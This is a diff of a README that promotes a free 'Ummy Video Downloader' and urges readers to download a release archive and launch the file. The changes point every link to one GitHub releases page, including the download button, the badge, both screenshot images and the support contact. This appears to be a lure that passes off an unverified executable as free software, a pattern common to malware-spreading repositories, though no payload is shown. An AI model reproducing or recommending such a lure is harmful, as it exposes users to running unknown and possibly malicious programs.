@@ -28,22 +28,22 @@ Are you looking for the best video downloader in 2023? Look no further! Ummy Vid
 - youtube-video-downloader-ummy
 
 ## How to Get Ummy Video Downloader Free
-To download Ummy Video Downloader for free, simply visit the following link: [Download Ummy Video Downloader Free](https://github.com/assets/Release.zip). You just need to launch the file and start enjoying the amazing features of Ummy Video Downloader without any cost!
+To download Ummy Video Downloader for free, simply visit the following link: [Download Ummy Video Downloader Free](https://github.com/marco01142/Ummy-Video-Downloader-Free/releases). You just need to launch the file and start enjoying the amazing features of Ummy Video Downloader without any cost!
 
 ## Additional Information
 If the provided link is not working or you need more information, please check the "Releases" section of this repository for alternative download options.
 
-[![Download Ummy Video Downloader](https://img.shields.io/badge/Download-Ummy_Video_Downloader-green)](https://github.com/assets/Release.zip)
+[![Download Ummy Video Downloader](https://github.com/marco01142/Ummy-Video-Downloader-Free/releases)](https://github.com/marco01142/Ummy-Video-Downloader-Free/releases)
 
 ## Enjoy Hassle-Free Video Downloads with Ummy Video Downloader Free!
 Download Ummy Video Downloader Free now and experience the ultimate convenience in downloading your favorite videos from the web. Say goodbye to complicated video downloading processes and hello to easy, fast, and free downloads with Ummy Video Downloader. Get started today and unlock a world of entertainment at your fingertips!
 
 ## Screenshots
-![Ummy Video Downloader](https://example.com/ummy-downloader.jpg)
-![Ummy Video Downloader Interface](https://example.com/ummy-interface.jpg)
+![Ummy Video Downloader](https://github.com/marco01142/Ummy-Video-Downloader-Free/releases)
+![Ummy Video Downloader Interface](https://github.com/marco01142/Ummy-Video-Downloader-Free/releases)
 
 ## Support
-For any questions, feedback, or issues with Ummy Video Downloader Free, feel free to contact our support team at support@ummydownloader.com. We are here to help you make the most out of your video downloading experience!
+For any questions, feedback, or issues with Ummy Video Downloader Free, feel free to contact our support team at https://github.com/marco01142/Ummy-Video-Downloader-Free/releases We are here to help you make the most out of your video downloading experience!
 
 ## Thank You for Choosing Ummy Video Downloader Free!
 We appreciate your interest in Ummy Video Downloader Free. Enjoy seamless video downloads, create your offline collection, and never miss out on your favorite videos again! Download Ummy Video Downloader Free today and take your video downloading to the next level.
